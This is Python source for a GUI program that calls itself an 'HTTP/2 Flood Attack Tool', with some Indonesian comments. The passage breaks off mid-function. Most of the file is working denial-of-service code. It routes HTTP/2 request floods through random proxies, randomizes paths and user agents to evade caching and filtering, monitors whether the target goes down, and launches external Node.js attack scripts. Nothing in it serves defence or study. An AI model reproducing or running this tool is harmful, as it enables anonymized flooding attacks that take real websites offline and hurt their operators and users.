import sys
import os
import random
import time
import threading
import socket
import ssl
import subprocess
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout,
    QHBoxLayout, QPushButton, QTextEdit, QLabel,
    QLineEdit, QGridLayout, QGroupBox, QProgressBar,
    QFileDialog, QMessageBox, QSpinBox, QTabWidget, QComboBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QTextCursor, QColor

import h2.connection
import h2.events
import pyqtgraph as pg
import requests


# ==========================================================
# HTTP/2 Flood Worker (CLEAN)
# ==========================================================
class HTTP2FloodWorker(QThread):
    update_signal = pyqtSignal(str, str)   # (message, color)
    stats_signal  = pyqtSignal(dict)       # stats dict
    finished_signal = pyqtSignal()

    def __init__(self, target, duration, rate, threads, proxy_file):
        super().__init__()
        self.target = target
        self.duration = duration
        self.rate = rate
        self.threads = threads
        self.proxy_file = proxy_file
        self.is_running = True
        self.stats = {
            "requests_sent": 0,
            "successful_responses": 0,
            "failed_responses": 0,
            "errors": 0
        }

    def run(self):
        self.start_time = time.time()
        self.end_time = self.start_time + self.duration
        try:
            with open(self.proxy_file, "r", encoding="utf-8", errors="ignore") as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.update_signal.emit(f"Error loading proxies: {str(e)}", "red")
            self.finished_signal.emit()
            return

        if not self.proxies:
            self.update_signal.emit("No proxies loaded from file", "red")
            self.finished_signal.emit()
            return

        self.update_signal.emit(f"Loaded {len(self.proxies)} proxies", "green")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while time.time() < self.end_time and self.is_running:
                for _ in range(self.rate):
                    executor.submit(self.attack_request)
                time.sleep(0.1)

        self.finished_signal.emit()

    def stop(self):
        self.is_running = False

    def attack_request(self):
        try:
            proxy = random.choice(self.proxies)
            proxy_host, proxy_port = proxy.split(':')
            proxy_port = int(proxy_port)

            parsed_target = urlparse(self.target)
            target_host = parsed_target.hostname
            target_port = parsed_target.port or 443
            target_path = parsed_target.path or '/'

            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)  # ⚡ sesuai permintaan
            sock.connect((proxy_host, proxy_port))
            self.update_signal.emit(f"Proxy connected: {proxy}", "cyan")

            # Proxy tunnel
            connect_request = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n"
            sock.send(connect_request.encode())
            response = sock.recv(4096).decode()
            if "200" not in response:
                self.stats['errors'] += 1
                self.update_signal.emit(f"Proxy {proxy} tunnel failed", "red")
                sock.close()
                return
            self.update_signal.emit(f"Tunnel established → {target_host}:{target_port}", "green")

            # SSL wrap
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=target_host)

            # HTTP/2 init
            conn = h2.connection.H2Connection()
            conn.initiate_connection()
            ssl_sock.send(conn.data_to_send())

            # Headers
            headers = self.generate_headers(target_host, target_path)
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, headers)
            ssl_sock.send(conn.data_to_send())
            self.update_signal.emit(f"Sent HTTP/2 request → {target_host}{target_path}", "yellow")

            self.stats['requests_sent'] += 1
            self.stats_signal.emit(self.stats.copy())

            # Response
            try:
                data = ssl_sock.recv(65535)
                if data:
                    events = conn.receive_data(data)
                    for event in events:
                        if isinstance(event, h2.events.ResponseReceived):
                            self.stats['successful_responses'] += 1
                            self.stats_signal.emit(self.stats.copy())
                            self.update_signal.emit("Response received ✅ 200 OK", "green")
            except:
                self.stats['failed_responses'] += 1
                self.stats_signal.emit(self.stats.copy())
                self.update_signal.emit("Response failed ❌", "red")

            ssl_sock.close()

        except Exception as e:
            self.stats['errors'] += 1
            self.stats_signal.emit(self.stats.copy())
            self.update_signal.emit(f"Error: {str(e)}", "red")

    def generate_headers(self, host, path):
        accept_headers = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        ]

        ua_file = "ua.txt"
        user_agents = []
        if os.path.exists(ua_file):
            try:
                with open(ua_file, "r", encoding="utf-8", errors="ignore") as f:
                    user_agents = [line.strip() for line in f if line.strip()]
            except Exception:
                user_agents = []

        if not user_agents:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            ]

        languages = ["en-US,en;q=0.9", "es-ES,es;q=0.8", "fr-FR,fr;q=0.7", "de-DE,de;q=0.6"]

        headers = [
            (":method", "GET"),
            (":authority", host),
            (":scheme", "https"),
            (":path", f"{path}?{random.randint(1000,9999)}"),
            ("user-agent", random.choice(user_agents)),
            ("accept", random.choice(accept_headers)),
            ("accept-language", random.choice(languages)),
            ("accept-encoding", "gzip, deflate, br"),
            ("cache-control", "no-cache"),
            ("pragma", "no-cache"),
            ("upgrade-insecure-requests", "1"),
        ]
        return headers


# ==========================================================
# Target Monitor (Status + Response Time)
# ==========================================================
class TargetMonitor(QThread):
    status_signal = pyqtSignal(str, str)  # msg, color

    def __init__(self, target):
        super().__init__()
        self.target = target
        self.running = True

    def run(self):
        while self.running:
            try:
                start = time.time()
                r = requests.get(self.target, timeout=2)
                elapsed = int((time.time() - start) * 1000)
                if r.status_code == 200:
                    self.status_signal.emit(f"UP (200) - {elapsed} ms", "green")
                else:
                    self.status_signal.emit(f"DOWN ({r.status_code})", "red")
            except Exception:
                self.status_signal.emit("DOWN (timeout)", "red")
            time.sleep(2)

    def stop(self):
        self.running = False
# ==========================================================
# Main GUI
# ==========================================================
class HTTP2FloodGUI(QMainWindow):
    log_signal = pyqtSignal(str, str)

    def __init__(self):
        super().__init__()
        self.log_signal.connect(self.update_log)
        self.setWindowTitle("⚡ HTTP/2 Flood Attack Tool - Premium Edition ⚡")
        self.setGeometry(100, 100, 1200, 800)
        self.worker = None
        self.monitor = None

        # Statistik awal
        self.js_requests_count = 0
        self.js_success_count = 0
        self.js_failed_count = 0
        self.js_error_count = 0
        self.js_start_time = 0

        self.stats = {
            "requests_sent": 0,
            "successful_responses": 0,
            "failed_responses": 0,
            "errors": 0,
            "start_time": 0
        }

        # Styling
        self.setStyleSheet("""
            QMainWindow { background-color: #0d0d0d; }
            QLabel { color: #39FF14; font-size: 12px; }
            QLineEdit, QSpinBox, QComboBox {
                background-color: #1a1a1a;
                color: #FFFFFF;
                border: 1px solid #39FF14;
                border-radius: 4px;
                padding: 4px;
            }
            QWidget { background-color: #111111; color: #39FF14; }
            QPushButton {
                background-color: #39FF14;
                color: black;
                border-radius: 5px;
                padding: 6px;
                font-weight: bold;
            }
            QPushButton:hover { background-color: #2ecc71; }
            QPushButton:pressed { background-color: #27ae60; }
            QTextEdit {
                background-color: #0d0d0d;
                color: #FFFFFF;
                border: 1px solid #39FF14;
                font-family: Consolas;
                font-size: 11px;
            }
            QGroupBox {
                border: 1px solid #39FF14;
                border-radius: 6px;
                margin-top: 10px;
                font-weight: bold;
                color: #39FF14;
                font-size: 13px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QProgressBar {
                border: 1px solid #39FF14;
                border-radius: 5px;
                text-align: center;
                background: #1a1a1a;
                color: white;
            }
            QProgressBar::chunk { background-color: #39FF14; }
        """)

        # Central widget + layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        # Title
        title = QLabel("⚡ HTTP/2 Flood Attack Tool - Premium Edition ⚡")
        title.setFont(QFont("Arial", 16, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("color: #39FF14; padding: 10px;")
        layout.addWidget(title)

        # Tabs
        self.tabs = QTabWidget()
        self.attack_tab = QWidget()
        self.js_tab = QWidget()
        self.stats_tab = QWidget()
        self.console_tab = QWidget()
        self.proxy_checker_tab = QWidget()
        self.proxy_scraping_tab = QWidget()

        self.tabs.addTab(self.attack_tab, "⚙️ Attack Settings")
        self.tabs.addTab(self.js_tab, "🕹️ JS Methods Attack")
        self.tabs.addTab(self.stats_tab, "📊 Statistics")
        self.tabs.addTab(self.console_tab, "💻 Realtime Console")
        self.tabs.addTab(self.proxy_checker_tab, "🛠️ Proxy Checker")
        self.tabs.addTab(self.proxy_scraping_tab, "🌐 Proxy Scraping")
        layout.addWidget(self.tabs)

        # Status bar
        self.status_bar = QLabel("✅ Ready to start attack")
        self.status_bar.setStyleSheet("color: #39FF14; padding: 5px; background-color: #1a1a1a;")
        layout.addWidget(self.status_bar)

        # Build isi tab
        self.setup_attack_tab()
        self.setup_js_tab()
        self.setup_stats_tab()
        self.setup_console_tab()            # <- bikin self.console_output
        self.setup_proxy_checker_tab()
        self.setup_proxy_scraping_tab()

    # ==========================================================
    # Attack Handlers
    # ==========================================================
    def start_attack(self):
        target = self.target_input.text()
        duration = self.duration_input.value()
        rate = self.rate_input.value()
        threads = self.threads_input.value()
        proxy_file = self.proxy_input.text()

        if not target.startswith("https://"):
            QMessageBox.warning(self, "Warning", "Target URL must start with https://")
            return

        if not os.path.exists(proxy_file):
            QMessageBox.warning(self, "Warning", "Proxy file does not exist")
            return

        # Reset stats
        self.stats = {
            "requests_sent": 0,
            "successful_responses": 0,
            "failed_responses": 0,
            "errors": 0,
            "start_time": time.time()
        }
        self.update_stats_display()

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_bar.setText("⚡ Attack in progress...")
        self.status_bar.setStyleSheet("color:orange; padding:5px; background-color:#1a1a1a;")

        self.worker = HTTP2FloodWorker(target, duration, rate, threads, proxy_file)
        self.worker.update_signal.connect(self.update_log)
        self.worker.stats_signal.connect(self.update_stats)
        self.worker.update_signal.emit("Loaded proxies", "green")   # string, bukan QTextCursor
        self.worker.finished_signal.connect(self.on_attack_finished)
        self.worker.start()

        # Monitor target
        self.monitor = TargetMonitor(target)
        self.monitor.status_signal.connect(self.update_target_status)
        self.monitor.start()

        # Progress bar countdown
        self.progress_bar.setValue(0)
        self.progress_timer = QTimer()
        self.progress_timer.timeout.connect(lambda: self.update_progress(duration))
        self.progress_timer.start(1000)

    def stop_attack(self):
        if self.worker:
            self.worker.stop()
            self.worker.quit()
            self.worker.wait(2000)
            self.worker.deleteLater()
            self.worker = None

        if self.monitor:
            self.monitor.stop()
            self.monitor.quit()
            self.monitor.wait(2000)
            self.monitor.deleteLater()
            self.monitor = None

        if hasattr(self, "progress_timer"):
            self.progress_timer.stop()

        self.on_attack_finished()
        self.update_log("⏹️ Attack stopped.", "red")

    def on_attack_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)

        if hasattr(self, "progress_timer"):
            self.progress_timer.stop()

        if self.monitor:
            self.monitor.stop()
            self.monitor.quit()
            self.monitor.wait(2000)
            self.monitor.deleteLater()
            self.monitor = None

        self.update_log("✅ Attack finished.", "green")
        self.progress_bar.setValue(100)
        
# ==========================================================
    # Log + Stats Update
    # ==========================================================
    def update_log(self, message, color="white"):
        color_map = {
            "red": "#FF3333",
            "green": "#39FF14",
            "yellow": "#FFFF33",
            "cyan": "#00FFFF",
            "white": "#FFFFFF"
        }
        html = f'<span style="color:{color_map.get(color,"#FFFFFF")};">{message}</span><br>'
        self.console_output.insertHtml(html)
        # ini jalan di thread utama GUI, jadi moveCursor aman
        self.console_output.moveCursor(QTextCursor.End)

    def update_stats(self, stats):
        self.stats.update(stats)
        self.update_stats_display()

    def update_stats_display(self):
        self.requests_label.setText(str(self.stats["requests_sent"]))
        self.success_label.setText(str(self.stats["successful_responses"]))
        self.failed_label.setText(str(self.stats["failed_responses"]))
        self.errors_label.setText(str(self.stats["errors"]))

        elapsed = time.time() - self.stats["start_time"]
        if elapsed > 0:
            rps = self.stats["requests_sent"] / elapsed
            self.rps_label.setText(f"{rps:.2f}")
            # update graph
            self.graph_counter += 1
            self.rps_data.append(rps)
            self.rps_time.append(self.graph_counter)
            self.rps_curve.setData(self.rps_time, self.rps_data)

    def update_progress(self, duration):
        elapsed = int(time.time() - self.stats["start_time"])
        progress = min(int((elapsed / duration) * 100), 100)
        self.progress_bar.setValue(progress)

    def update_target_status(self, msg, color):
        self.target_status_label.setText(msg)
        if color == "green":
            self.target_status_label.setStyleSheet("color:#39FF14; font-weight:bold;")
        else:
            self.target_status_label.setStyleSheet("color:#FF3333; font-weight:bold;")       
    # ==========================================================
    # Setup Attack Tab
    # ==========================================================
    def setup_attack_tab(self):
        attack_layout = QVBoxLayout(self.attack_tab)

        # Group Input
        input_group = QGroupBox("⚙️ Attack Parameters")
        input_layout = QGridLayout()

        # Target URL
        lbl_url = QLabel("🌍 Target URL")
        lbl_url.setFont(QFont("Arial", 11, QFont.Bold))
        input_layout.addWidget(lbl_url, 0, 0)
        self.target_input = QLineEdit("https://example.com")
        input_layout.addWidget(self.target_input, 0, 1, 1, 2)

        # Duration
        lbl_duration = QLabel("⏳ Duration (seconds)")
        lbl_duration.setFont(QFont("Arial", 11, QFont.Bold))
        input_layout.addWidget(lbl_duration, 1, 0)
        self.duration_input = QSpinBox()
        self.duration_input.setRange(1, 7200)
        self.duration_input.setValue(60)
        input_layout.addWidget(self.duration_input, 1, 1, 1, 2)

        # Rate
        lbl_rate = QLabel("📈 Request Rate")
        lbl_rate.setFont(QFont("Arial", 11, QFont.Bold))
        input_layout.addWidget(lbl_rate, 2, 0)
        self.rate_input = QSpinBox()
        self.rate_input.setRange(1, 2000)
        self.rate_input.setValue(10)
        input_layout.addWidget(self.rate_input, 2, 1, 1, 2)

        # Threads
        lbl_threads = QLabel("🧵 Threads")
        lbl_threads.setFont(QFont("Arial", 11, QFont.Bold))
        input_layout.addWidget(lbl_threads, 3, 0)
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, 200)
        self.threads_input.setValue(10)
        input_layout.addWidget(self.threads_input, 3, 1, 1, 2)

        # Proxy File
        lbl_proxy = QLabel("🛠️ Proxy File")
        lbl_proxy.setFont(QFont("Arial", 11, QFont.Bold))
        input_layout.addWidget(lbl_proxy, 4, 0)
        self.proxy_input = QLineEdit("proxies.txt")
        input_layout.addWidget(self.proxy_input, 4, 1)
        self.browse_btn = QPushButton("Browse")
        ##self.browse_btn.clicked.connect(self.browse_proxy_file)
        self.browse_btn.clicked.connect(lambda: self.browse_input_file(self.proxy_input))
        input_layout.addWidget(self.browse_btn, 4, 2)

        input_group.setLayout(input_layout)
        attack_layout.addWidget(input_group)

        # Buttons
        button_layout = QHBoxLayout()
        self.start_btn = QPushButton("▶️ Start Attack")
        self.start_btn.clicked.connect(self.start_attack)
        button_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("⏹️ Stop Attack")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        button_layout.addWidget(self.stop_btn)

        attack_layout.addLayout(button_layout)

        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 1px solid #39FF14;
                border-radius: 4px;
                text-align: center;
                background-color: #0d0d0d;
                color: #39FF14;
            }
            QProgressBar::chunk {
                background-color: #39FF14;
                width: 10px;
            }
        """)
        attack_layout.addWidget(self.progress_bar)


    # ==========================================================
    # Setup JS Methods Attack Tab
    # ==========================================================
    def setup_js_tab(self):
        js_layout = QVBoxLayout(self.js_tab)

        # Group Input
        js_group = QGroupBox("🕹️ JS Methods Attack Parameters")
        js_grid = QGridLayout()

        # Target URL
        lbl_jsurl = QLabel("🌍 Target URL")
        lbl_jsurl.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jsurl, 0, 0)
        self.js_url_input = QLineEdit("https://example.com")
        js_grid.addWidget(self.js_url_input, 0, 1, 1, 2)

        # Duration
        lbl_jstime = QLabel("⏳ Duration (seconds)")
        lbl_jstime.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jstime, 1, 0)
        self.js_time_input = QSpinBox()
        self.js_time_input.setRange(1, 7200)
        self.js_time_input.setValue(60)
        js_grid.addWidget(self.js_time_input, 1, 1, 1, 2)

        # Rate
        lbl_jsrate = QLabel("📈 Request Rate")
        lbl_jsrate.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jsrate, 2, 0)
        self.js_rate_input = QSpinBox()
        self.js_rate_input.setRange(1, 2000)
        self.js_rate_input.setValue(10)
        js_grid.addWidget(self.js_rate_input, 2, 1, 1, 2)

        # Threads
        lbl_jsthreads = QLabel("🧵 Threads")
        lbl_jsthreads.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jsthreads, 3, 0)
        self.js_threads_input = QSpinBox()
        self.js_threads_input.setRange(1, 200)
        self.js_threads_input.setValue(10)
        js_grid.addWidget(self.js_threads_input, 3, 1, 1, 2)

        # Proxy File
        lbl_jsproxy = QLabel("🛠️ Proxy File")
        lbl_jsproxy.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jsproxy, 4, 0)
        self.js_proxy_input = QLineEdit("proxies.txt")
        js_grid.addWidget(self.js_proxy_input, 4, 1)
        self.js_browse_btn = QPushButton("Browse")
        self.js_browse_btn.clicked.connect(self.browse_js_proxy_file)
        js_grid.addWidget(self.js_browse_btn, 4, 2)

        # JS File selector
        lbl_jsfile = QLabel("📂 Select JS File")
        lbl_jsfile.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jsfile, 5, 0)
        self.js_file_combo = QComboBox()
        self.load_js_files()
        js_grid.addWidget(self.js_file_combo, 5, 1, 1, 2)

        js_group.setLayout(js_grid)
        js_layout.addWidget(js_group)

        # Buttons
        js_button_layout = QHBoxLayout()
        self.js_start_btn = QPushButton("▶️ Start JS Attack")
        self.js_start_btn.clicked.connect(self.start_js_attack)
        js_button_layout.addWidget(self.js_start_btn)

        self.js_stop_btn = QPushButton("⏹️ Stop JS Attack")
        self.js_stop_btn.clicked.connect(self.stop_js_attack)
        self.js_stop_btn.setEnabled(False)
        js_button_layout.addWidget(self.js_stop_btn)

        js_layout.addLayout(js_button_layout)

        # JS Progress bar
        self.js_progress_bar = QProgressBar()
        self.js_progress_bar.setValue(0)
        self.js_progress_bar.setStyleSheet("""
            QProgressBar {
                border: 1px solid #39FF14;
                border-radius: 4px;
                text-align: center;
                background-color: #0d0d0d;
                color: #39FF14;
            }
            QProgressBar::chunk { background-color: #39FF14; }
        """)
        js_layout.addWidget(self.js_progress_bar)

        # JS Statistics group
        js_stats_group = QGroupBox("📊 JS Attack Statistics")
        js_stats_grid = QGridLayout()

        js_stats_grid.addWidget(QLabel("Requests Sent:"), 0, 0)
        self.js_requests_label = QLabel("0")
        self.js_requests_label.setStyleSheet("color:#39FF14; font-weight:bold;")
        js_stats_grid.addWidget(self.js_requests_label, 0, 1)

        js_stats_grid.addWidget(QLabel("Successful Responses:"), 1, 0)
        self.js_success_label = QLabel("0")
        self.js_success_label.setStyleSheet("color:#39FF14; font-weight:bold;")
        js_stats_grid.addWidget(self.js_success_label, 1, 1)

        js_stats_grid.addWidget(QLabel("Failed Responses:"), 2, 0)
        self.js_failed_label = QLabel("0")
        self.js_failed_label.setStyleSheet("color:#FF3333; font-weight:bold;")
        js_stats_grid.addWidget(self.js_failed_label, 2, 1)

        js_stats_grid.addWidget(QLabel("Errors:"), 3, 0)
        self.js_errors_label = QLabel("0")
        self.js_errors_label.setStyleSheet("color:#FF3333; font-weight:bold;")
        js_stats_grid.addWidget(self.js_errors_label, 3, 1)

        js_stats_grid.addWidget(QLabel("Requests per Second:"), 4, 0)
        self.js_rps_label = QLabel("0")
        self.js_rps_label.setStyleSheet("color:#39FF14; font-weight:bold;")
        js_stats_grid.addWidget(self.js_rps_label, 4, 1)

        js_stats_group.setLayout(js_stats_grid)
        js_layout.addWidget(js_stats_group)
    # ==========================================================
    # Setup Statistics Tab
    # ==========================================================
    def setup_stats_tab(self):
        stats_layout = QVBoxLayout(self.stats_tab)

        stats_group = QGroupBox("📊 Real-time Statistics")
        stats_grid = QGridLayout()

        # Requests Sent
        lbl_req = QLabel("Requests Sent")
        lbl_req.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_req, 0, 0)
        self.requests_label = QLabel("0")
        self.requests_label.setStyleSheet("color:#39FF14; font-weight:bold;")
        stats_grid.addWidget(self.requests_label, 0, 1)

        # Successful
        lbl_succ = QLabel("Successful Responses")
        lbl_succ.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_succ, 1, 0)
        self.success_label = QLabel("0")
        self.success_label.setStyleSheet("color:#39FF14; font-weight:bold;")
        stats_grid.addWidget(self.success_label, 1, 1)

        # Failed
        lbl_fail = QLabel("Failed Responses")
        lbl_fail.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_fail, 2, 0)
        self.failed_label = QLabel("0")
        self.failed_label.setStyleSheet("color:#FF3333; font-weight:bold;")
        stats_grid.addWidget(self.failed_label, 2, 1)

        # Errors
        lbl_err = QLabel("Errors")
        lbl_err.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_err, 3, 0)
        self.errors_label = QLabel("0")
        self.errors_label.setStyleSheet("color:#FF3333; font-weight:bold;")
        stats_grid.addWidget(self.errors_label, 3, 1)

        # RPS
        lbl_rps = QLabel("Requests per Second")
        lbl_rps.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_rps, 4, 0)
        self.rps_label = QLabel("0")
        self.rps_label.setStyleSheet("color:#39FF14; font-weight:bold;")
        stats_grid.addWidget(self.rps_label, 4, 1)

        # Target Status
        lbl_status = QLabel("Target Status")
        lbl_status.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_status, 5, 0)
        self.target_status_label = QLabel("Unknown")
        self.target_status_label.setStyleSheet("color:#FFFF33; font-weight:bold;")
        stats_grid.addWidget(self.target_status_label, 5, 1)

        stats_group.setLayout(stats_grid)
        stats_layout.addWidget(stats_group)

        # Graph Section
        graph_group = QGroupBox("📈 Realtime RPS Graph")
        graph_layout = QVBoxLayout()

        self.graph_widget = pg.PlotWidget()
        self.graph_widget.setBackground("black")
        self.graph_widget.setTitle("Requests Per Second", color="w", size="12pt")
        self.graph_widget.showGrid(x=True, y=True)
        self.graph_widget.setLabel("left", "RPS", color="white")
        self.graph_widget.setLabel("bottom", "Time (s)", color="white")
        self.rps_curve = self.graph_widget.plot(pen=pg.mkPen(color="#39FF14", width=2))
        self.rps_data = []
        self.rps_time = []
        self.graph_counter = 0

        graph_layout.addWidget(self.graph_widget)
        graph_group.setLayout(graph_layout)
        stats_layout.addWidget(graph_group)


    # ==========================================================
    # Setup Console Tab
    # ==========================================================
    def setup_console_tab(self):
        console_layout = QVBoxLayout(self.console_tab)

        lbl_console = QLabel("💻 Realtime Console Log")
        lbl_console.setFont(QFont("Arial", 11, QFont.Bold))
        lbl_console.setStyleSheet("color:#39FF14;")
        console_layout.addWidget(lbl_console)

        self.console_output = QTextEdit()
        self.console_output.setReadOnly(True)
        self.console_output.setStyleSheet(
            "background-color:#0d0d0d; color:white; font-family:Consolas; font-size:11px;"
        )
        console_layout.addWidget(self.console_output)
        
# ==========================================================
    # JS Attack Handlers
    # ==========================================================
            # reset statistik JS
        self.js_requests_count = 0
        self.js_success_count = 0
        self.js_failed_count = 0
        self.js_error_count = 0
        self.js_start_time = time.time()
        self.update_js_stats()

    
    def start_js_attack(self):
                # Reset statistik JS Attack
        self.js_requests_count = 0
        self.js_success_count = 0
        self.js_failed_count = 0
        self.js_error_count = 0
        self.js_start_time = time.time()
        self.update_js_stats()

        
        js_file = self.js_file_combo.currentText()
        target = self.js_url_input.text()
        duration = str(self.js_time_input.value())
        rate = str(self.js_rate_input.value())
        threads = str(self.js_threads_input.value())
        proxy = self.js_proxy_input.text()

        if not js_file or not os.path.exists(js_file):
            QMessageBox.warning(self, "Warning", "Please select a valid JS file")
            return

        if not os.path.exists(proxy):
            QMessageBox.warning(self, "Warning", "Proxy file not found")
            return

        self.js_start_btn.setEnabled(False)
        self.js_stop_btn.setEnabled(True)
        self.log_signal.emit(f"▶️ Running Node.js: {js_file}", "cyan")

        cmd = ["node", js_file, target, duration, rate, threads, proxy]
        self.js_process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        # Progress bar
        self.js_progress_bar.setValue(0)
        self.js_start_time = time.time()
        self.js_duration = int(duration)
        self.js_timer = QTimer()
        self.js_timer.timeout.connect(self.update_js_progress)
        self.js_timer.start(1000)

        # Read logs
        threading.Thread(target=self.read_js_logs, daemon=True).start()

    def read_js_logs(self):
        for line in iter(self.js_process.stdout.readline, ""):
            if not line:
                break

            # bikin variabel text dari output JS
            text = line.strip()

            # kirim ke GUI pakai signal biar aman
            self.log_signal.emit(text, "white")

            # parse statistik sederhana dari log JS
            if "SUCCESS" in text:
                self.js_success_count += 1
            elif "FAIL" in text:
                self.js_failed_count += 1
            elif "ERROR" in text:
                self.js_error_count += 1

            self.js_requests_count += 1
            self.update_js_stats()



    def stop_js_attack(self):
        if hasattr(self, "js_process") and self.js_process:
            self.js_process.terminate()
            self.js_process = None
        if hasattr(self, "js_timer"):
            self.js_timer.stop()
        self.js_start_btn.setEnabled(True)
        self.js_stop_btn.setEnabled(False)
        self.update_log("⏹️ JS Attack stopped.", "red")

    def update_js_progress(self):
        elapsed = int(time.time() - self.js_start_time)
        progress = min(int((elapsed / self.js_duration) * 100), 100)
        self.js_progress_bar.setValue(progress)


    def update_js_stats(self):
        self.js_requests_label.setText(str(self.js_requests_count))
        self.js_success_label.setText(str(self.js_success_count))
        self.js_failed_label.setText(str(self.js_failed_count))
        self.js_errors_label.setText(str(self.js_error_count))

        elapsed = time.time() - self.js_start_time
        if elapsed > 0:
            rps = self.js_requests_count / elapsed
            self.js_rps_label.setText(f"{rps:.2f}")

 
    # ==========================================================
    # File Browsers
    # ==========================================================
    def browse_input_file(self, target_line_edit):
        path, _ = QFileDialog.getOpenFileName(
            self,
            "Select Text File",
            "",
            "Text Files (*.txt);;All Files (*)"
        )
        if path:
            target_line_edit.setText(path)
            
    # ==========================================================
    # File Browsers
    # ==========================================================
    def browse_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Proxy File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.proxy_input.setText(file_path)

    def browse_js_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Proxy File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.js_proxy_input.setText(file_path)

    def load_js_files(self):
        self.js_file_combo.clear()
        for f in os.listdir("."):
            if f.endswith(".js"):
                self.js_file_combo.addItem(f)



    # ==========================================================
    # Setup Proxy Checker Tab
    # ==========================================================
    def setup_proxy_checker_tab(self):
        checker_layout = QVBoxLayout(self.proxy_checker_tab)

        group = QGroupBox("🛠️ Proxy Checker")
        grid = QGridLayout()

        # Proxy File input
        lbl_proxyfile = QLabel("📂 Proxy File")
        lbl_proxyfile.setFont(QFont("Arial", 11, QFont.Bold))
        grid.addWidget(lbl_proxyfile, 0, 0)
        self.checker_proxy_input = QLineEdit("proxies.txt")
        grid.addWidget(self.checker_proxy_input, 0, 1)
        btn_browse_proxy = QPushButton("Browse")
        btn_browse_proxy.clicked.connect(self.browse_proxy_file_checker)
        grid.addWidget(btn_browse_proxy, 0, 2)

        # Output File input
        lbl_outputfile = QLabel("💾 Output File")
        lbl_outputfile.setFont(QFont("Arial", 11, QFont.Bold))
        grid.addWidget(lbl_outputfile, 1, 0)
        self.checker_output_input = QLineEdit("inputfile.txt")
        grid.addWidget(self.checker_output_input, 1, 1, 1, 2)

        # Threads input
        lbl_threads = QLabel("🧵 Threads")
        lbl_threads.setFont(QFont("Arial", 11, QFont.Bold))
        grid.addWidget(lbl_threads, 2, 0)
        self.checker_threads_input = QSpinBox()
        self.checker_threads_input.setRange(1, 500)
        self.checker_threads_input.setValue(50)
        grid.addWidget(self.checker_threads_input, 2, 1, 1, 2)

        group.setLayout(grid)
        checker_layout.addWidget(group)

        # Buttons
        btn_layout = QHBoxLayout()
        self.btn_start_checker = QPushButton("▶️ Start Checking")
        self.btn_start_checker.clicked.connect(self.start_proxy_checker)
        btn_layout.addWidget(self.btn_start_checker)

        self.btn_stop_checker = QPushButton("⏹️ Stop")
        self.btn_stop_checker.setEnabled(False)
        self.btn_stop_checker.clicked.connect(self.stop_proxy_checker)
        btn_layout.addWidget(self.btn_stop_checker)

        checker_layout.addLayout(btn_layout)

        # Log console
        self.proxy_checker_log = QTextEdit()
        self.proxy_checker_log.setReadOnly(True)
        self.proxy_checker_log.setStyleSheet(
            "background-color:#0d0d0d; color:white; font-family:Consolas; font-size:11px;"
        )
        checker_layout.addWidget(self.proxy_checker_log)
        
    # ==========================================================
    # Proxy Checker Handlers (GUI)
    # ==========================================================
    def browse_proxy_file_checker(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Proxy File", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.checker_proxy_input.setText(file_path)

    def start_proxy_checker(self):
        proxy_file = self.checker_proxy_input.text()
        output_file = self.checker_output_input.text()
        threads = self.checker_threads_input.value()

        if not os.path.exists(proxy_file):
